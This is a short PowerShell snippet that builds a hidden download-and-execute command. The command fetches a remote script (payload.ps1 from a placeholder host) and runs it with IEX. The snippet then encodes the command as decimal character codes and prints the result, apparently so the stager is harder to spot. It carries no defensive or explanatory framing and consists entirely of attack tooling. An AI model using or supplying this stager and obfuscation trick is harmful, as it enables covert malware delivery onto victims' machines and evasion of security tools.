$cmd = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"'
$obfuscated = ($cmd.ToCharArray() | ForEach-Object { [int][char]$_ }) -join ' '
Write-Host "Obfuscated Command:`n$obfuscated"